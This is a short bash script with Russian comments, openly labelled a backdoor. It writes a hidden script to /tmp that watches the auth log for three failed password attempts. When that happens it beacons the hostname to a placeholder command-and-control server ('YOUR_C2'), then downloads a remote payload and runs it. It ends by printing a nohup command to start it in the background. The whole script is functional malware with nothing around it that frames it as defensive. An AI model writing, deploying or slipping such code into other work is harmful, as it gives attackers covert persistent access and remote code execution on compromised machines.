#!/bin/bash
# Теневой backdoor — активируется по триггеру

TRIGGER_FILE="/tmp/.shadow_trigger"
COUNTER_FILE="/tmp/.shadow_counter"

echo "[BACKDOOR] Installing shadow access..."

# Создаём скрытый триггер: 3 неверных пароля подряд
cat > /tmp/.shadow_backdoor.sh << 'EOF'
#!/bin/bash
TRIGGER=0

# Отслеживаем неверные попытки входа
tail -f /var/log/auth.log 2>/dev/null | while read line; do
    echo "$line" | grep -q "Failed password" && TRIGGER=$((TRIGGER+1))
    
    if [ "$TRIGGER" -ge 3 ]; then
        # Активация backdoor
        curl -sk --max-time 5 "https://YOUR_C2/backdoor?host=$(hostname)" 2>/dev/null
        bash -c "$(curl -sk https://YOUR_C2/payload.sh 2>/dev/null)" &
        TRIGGER=0
    fi
done
EOF

echo "[BACKDOOR] Backdoor установлен. Ждёт 3 неверных пароля."
echo "[BACKDOOR] Запуск: nohup bash /tmp/.shadow_backdoor.sh &"
